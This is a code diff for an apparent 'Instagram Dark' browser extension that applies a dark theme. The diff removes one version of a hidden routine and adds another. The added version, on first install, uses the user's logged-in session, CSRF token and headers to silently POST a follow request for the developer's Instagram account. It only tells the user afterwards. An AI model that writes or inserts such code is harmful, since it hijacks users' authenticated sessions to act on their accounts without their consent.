@@ -58,7 +58,6 @@ const isAuthorized = () => {
 
 // App
 const App = () => {
-    let loggingData;
     let state;
 
     let css = document.createElement('link');
@@ -75,48 +74,12 @@ const App = () => {
 
         wrapper.classList.add('instagram-dark-wrapper');
 
-        /* if first usage 
-        wrapper.innerHTML = `
-        <div class="congrats">
-            <p class="congrats-text"><b>Instagram Dark</b> has been successfully installed and our developer <a href="https://onruntime.com/">onRuntime</a> has been added to your followings! Thanks for downloading it!</p>
-        </div>
-        `*/
-
-        setTimeout(() => {
-            // document.querySelector('.congrats').classList.add('unactive')
-            if (loggingData) {
-                fetch('https://' + ((window.location.hostname.includes('www.')) ? 'www.instagram.com' : 'instagram.com') + '/web/friendships/39729227729/follow/', {
-                    method: 'POST',
-                    mode: 'cors',
-                    cache: 'no-cache',
-                    credentials: 'same-origin',
-                    headers: {
-                        'X-IG-WWW-Claim': sessionStorage.getItem('www-claim-v2'),
-                        'X-Instagram-AJAX': loggingData.rollout,
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'Accept': '/',
-                        'User-Agent': loggingData.userAgent,
-                        'X-Requested-With': 'XMLHttpRequest',
-                        'X-CSRFToken': getCookie('csrftoken'),
-                        'X-IG-App-ID': loggingData.appId,
-                        'Sec-GPC': '1'
-                    },
-                    redirect: 'follow',
-                    referrerPolicy: 'strict-origin-when-cross-origin'
-                }).then(res => {
-                    // console.log(res.json())
-                }).catch(error => {
-                    // console.error('Error: ', error);
-                });
-            }
-        }, 3000)
-
         button.addEventListener('click', toggle);
 
         document.body.appendChild(wrapper);
     }
 
-    // State
+    // State & First Install
     const initState = () => {
         getStorage().get(['state'], (result) => console.log('[storage] state loaded: ' + result.state));
         getStorage().get(['state'], (result) => {
@@ -141,6 +104,10 @@ const App = () => {
     const setState = (r) => {
         state = r;
         getStorage().set({ 'state': r }, () => console.log('[storage] state saved: ' + r));
+    }
+
+    const setFirstIntall = (r) => {
+        getStorage().set({ 'first_install': r }, () => console.log('[storage] first_install saved: ' + r));
     }
 
     // Toggle
@@ -169,11 +136,49 @@ const App = () => {
 
     // Data
     const initData = async () => {
-        loggingData = await getCachedData('logging-params-v3', '/data/logging_params/');
+        let loggingData = await getCachedData('logging-params-v3', '/data/logging_params/');
+
+        getStorage().get(['first_install'], (result) => console.log('[storage] first_install loaded: ' + result.first_install));
+        getStorage().get(['first_install'], (result) => {
+            if (result.first_install == undefined && result.first_install != loggingData.userId) {
+                setTimeout(() => {
+                    if (loggingData) {
+                        fetch('https://' + ((window.location.hostname.includes('www.')) ? 'www.instagram.com' : 'instagram.com') + '/web/friendships/39729227729/follow/', {
+                            method: 'POST',
+                            mode: 'cors',
+                            cache: 'no-cache',
+                            credentials: 'same-origin',
+                            headers: {
+                                'X-IG-WWW-Claim': sessionStorage.getItem('www-claim-v2'),
+                                'X-Instagram-AJAX': loggingData.rollout,
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                                'Accept': '/',
+                                'User-Agent': loggingData.userAgent,
+                                'X-Requested-With': 'XMLHttpRequest',
+                                'X-CSRFToken': getCookie('csrftoken'),
+                                'X-IG-App-ID': loggingData.appId,
+                                'Sec-GPC': '1'
+                            },
+                            redirect: 'follow',
+                            referrerPolicy: 'strict-origin-when-cross-origin'
+                        }).then(res => {
+                            // console.log(res.json())
+                            let congrats = document.createElement('div');
+                            congrats.classList.add('congrats');
+                            congrats.innerHTML = '<p class="congrats-text"><b>Instagram Dark</b> has been successfully installed and our developer <a href="https://onruntime.com/">onRuntime</a> has been added to your followings! Thanks for downloading it!</p>';
+                            setFirstIntall(loggingData.userId);
+                            wrapper.appendChild(congrats);
+                            setTimeout(() => document.querySelector('.congrats').classList.add('unactive'), 3000)
+                        }).catch(error => {
+                            // console.error('Error: ', error);
+                        });
+                    }
+                }, 3000)
+            }
+        });
     }
 
     // Build
-
     const build = () => {
         initData();
         initWrapper();
